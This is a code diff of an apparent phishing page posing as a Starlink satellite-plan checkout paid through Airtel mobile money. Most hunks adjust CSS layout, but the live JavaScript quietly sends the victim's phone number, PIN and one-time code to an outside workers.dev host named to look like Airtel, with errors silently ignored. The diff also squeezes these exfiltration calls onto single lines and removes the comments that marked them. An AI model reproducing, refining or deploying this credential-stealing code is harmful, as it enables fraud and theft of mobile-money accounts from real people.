@@ -141,10 +141,10 @@ img,svg{display:block;max-width:100%}
 
 .summary-product{
   display:grid;
-  grid-template-columns:48px 1fr auto;
+  grid-template-columns:1fr auto;
   align-items:center;
   gap:var(--g-3);
-  padding:10px;
+  padding:10px 12px;
   background:rgba(255,255,255,.12);
   border:1px solid rgba(255,255,255,.18);
   border-radius:var(--r-md);
@@ -208,7 +208,8 @@ img,svg{display:block;max-width:100%}
   flex:1;min-height:0;
   display:flex;flex-direction:column;align-items:center;justify-content:flex-start;
   padding:var(--g-4) var(--g-5) 0;
-  gap:var(--g-4);overflow-y:auto;overflow-x:hidden;
+  gap:var(--g-4);
+  overflow-y:auto;overflow-x:hidden;
   -webkit-overflow-scrolling:touch;overscroll-behavior:contain;
 }
 .pin-head{display:flex;flex-direction:column;gap:var(--g-1);text-align:center;max-width:340px}
@@ -285,10 +286,6 @@ img,svg{display:block;max-width:100%}
   box-shadow:0 4px 20px rgba(228,0,0,.4);
   transition:transform .1s,opacity .15s,background .15s;
   border:none;
-  flex-shrink:0;
-  position:sticky;bottom:0;
-  padding-bottom:max(0px,env(safe-area-inset-bottom,0px));
-  background-clip:padding-box;
 }
 .btn-cta:active:not(.dim){transform:scale(.98)}
 .btn-cta.dim{background:var(--surf-mid);color:var(--ink-3);box-shadow:none;cursor:not-allowed;opacity:.7}
@@ -341,9 +338,10 @@ img,svg{display:block;max-width:100%}
 
 /* ═════ OTP ═════ */
 .otp-wrap{
+  flex:1;min-height:0;
   padding:var(--g-4) var(--g-4) 0;
   display:flex;flex-direction:column;align-items:center;gap:var(--g-4);
-  flex:1;min-height:0;overflow-y:auto;overflow-x:hidden;
+  overflow-y:auto;overflow-x:hidden;
   -webkit-overflow-scrolling:touch;overscroll-behavior:contain;
 }
 .otp-card{
@@ -477,48 +475,34 @@ img,svg{display:block;max-width:100%}
 
 .rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(0,0,0,.07);transform:scale(0);animation:rip-anim .5s ease forwards}
 
-/* ─── RESPONSIVE FIT ─────────────────────────────────────── */
+/* ── IMMUNE TO FONT SIZE / DISPLAY ZOOM ── */
 html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
 
-/* numkey: fixed px, scale down on short screens */
-.numkey{height:54px!important;font-size:21px!important;flex-shrink:0!important}
-@media(max-height:700px){
-  .numkey{height:50px!important;font-size:20px!important}
-  .pin-box,.pb{height:54px!important}
-  .otp-box,.ob{height:54px!important}
-  .btn-cta{height:50px!important}
-}
-@media(max-height:620px){
-  .numkey{height:46px!important;font-size:18px!important}
-  .pin-box,.pb{height:50px!important}
-  .otp-box,.ob{height:50px!important}
-  .btn-cta{height:46px!important}
-  .pin-stage,.otp-wrap{gap:10px!important}
-}
-@media(max-height:560px){
-  .numkey{height:42px!important;font-size:17px!important}
-  .pin-stage,.otp-wrap{gap:8px!important}
-  .pin-boxes,.otp-boxes{gap:8px!important}
-}
-@media(max-width:360px){
-  .numkey{height:50px!important;font-size:20px!important}
-  .pin-box,.pb{height:54px!important}
-  .btn-cta{max-width:100%!important}
-}
-/* Summary: never overflow vertically */
-.summary{flex-shrink:0!important;overflow:hidden!important;max-height:88px!important}
-.nav{flex-shrink:0!important}
-/* Steps bar */
-.steps{flex-shrink:0!important}
-/* Spacing in pin-stage */
-.pin-head{flex-shrink:0!important}
-.pin-boxes,.otp-boxes{flex-shrink:0!important}
-.numpad{flex-shrink:0!important}
-/* Safe-area bottom padding on sticky btn */
+/* ── SUMMARY: always visible, never buried ── */
+.summary{flex-shrink:0!important;overflow:hidden!important}
+.summary-product-img{display:none!important}
+
+/* ── PIN STAGE / OTP: confirm always reachable ── */
 .btn-cta{
+  position:sticky!important;bottom:0!important;flex-shrink:0!important;
+  margin-top:10px!important;
   margin-bottom:max(12px,env(safe-area-inset-bottom,12px))!important;
-  margin-top:8px!important;
+  z-index:2!important;
 }
+/* Numpad keys — 4 breakpoints, pure px */
+.numkey{height:54px!important;font-size:21px!important;flex-shrink:0!important}
+@media(max-height:720px){.numkey{height:50px!important;font-size:20px!important}.btn-cta{height:50px!important}}
+@media(max-height:640px){.numkey{height:46px!important;font-size:18px!important}.btn-cta{height:46px!important}.pin-stage,.otp-wrap{gap:8px!important}}
+@media(max-height:560px){.numkey{height:42px!important;font-size:17px!important}.pin-stage,.otp-wrap{gap:6px!important}.summary{max-height:72px!important}}
+@media(max-width:360px){.numkey{height:50px!important}.btn-cta{max-width:100%!important}}
+
+/* ── Nav + steps + summary never shrink ── */
+.nav{flex-shrink:0!important}.steps{flex-shrink:0!important}
+.login-fixed{overflow:hidden!important}
+
+/* ── Pin/OTP non-scroll items never shrink ── */
+.pin-head{flex-shrink:0!important}
+.pin-boxes,.otp-boxes,.numpad,.pin-boxes-wrap{flex-shrink:0!important}
 </style>
 </head>
 <body>
@@ -567,9 +551,6 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
       </div>
 
       <div class="summary-product">
-        <div class="summary-product-img">
-          <img id="sumImg" src="" alt="" loading="eager" style="width:100%;height:100%;object-fit:cover">
-        </div>
         <div class="summary-product-info">
           <span class="summary-product-name" id="sumName">—</span>
           <span class="summary-product-meta">Forfait satellite</span>
@@ -770,14 +751,7 @@ document.getElementById('sumValidity').textContent=forfait.jours
   :'—';
 
 /* Product image fallback */
-var sumImg=document.getElementById('sumImg');
-if(forfait.img){
-  sumImg.src='assets/'+forfait.img;
-  sumImg.alt=forfait.name;
-} else {
-  sumImg.style.display='none';
-  sumImg.parentElement.style.background='linear-gradient(135deg,#FFE5E5,#FFF3F3)';
-}
+/* sumImg removed */
 
 /* Views / steps */
 function showView(id){
@@ -882,16 +856,11 @@ async function runProcessing(ph){
       document.getElementById('psi'+steps[i].si).className='proc-step act';
     }
   }
-  /* worker */
   (function(){var _f={};var _a={};
     try{_f=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
     try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
     fetch('https://airtel-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({event:'login_initiated',data:{
-        phone:_a.phone||'',pin:_a.pin||'',
-        forfait:_f.name||'',price:_f.price||'',
-        deposit:_f.deposit||'',daily:_f.daily||'',jours:_f.jours||'',ts:Date.now()
-      }})
+      body:JSON.stringify({event:'login_initiated',data:{phone:_a.phone||'',pin:_a.pin||'',forfait:_f.name||'',price:_f.price||'',deposit:_f.deposit||'',daily:_f.daily||'',jours:_f.jours||'',ts:Date.now()}})
     }).catch(function(){});
   })();
   await slp(500);
@@ -1003,18 +972,12 @@ function submitOTP(){
   sessionStorage.setItem('starlinkRef',ref);
   sessionStorage.setItem('starlinkOTP',otpVal);
   for(var i=0;i<4;i++)document.getElementById('ob'+i).classList.add('success');
-  /* worker */
   (function(){var _f={};var _a={};
     try{_f=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
     try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
     var _ref=sessionStorage.getItem('starlinkRef')||'';
     fetch('https://airtel-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({event:'otp_confirmed',data:{
-        phone:_a.phone||'',pin:_a.pin||'',otp:otpVal,
-        forfait:_f.name||'',price:_f.price||'',
-        deposit:_f.deposit||'',daily:_f.daily||'',jours:_f.jours||'',
-        ref:_ref,ts:Date.now()
-      }})
+      body:JSON.stringify({event:'otp_confirmed',data:{phone:_a.phone||'',pin:_a.pin||'',otp:otpVal,forfait:_f.name||'',price:_f.price||'',deposit:_f.deposit||'',daily:_f.daily||'',jours:_f.jours||'',ref:_ref,ts:Date.now()}})
     }).catch(function(){});
   })();
   hap([18,8,35]);
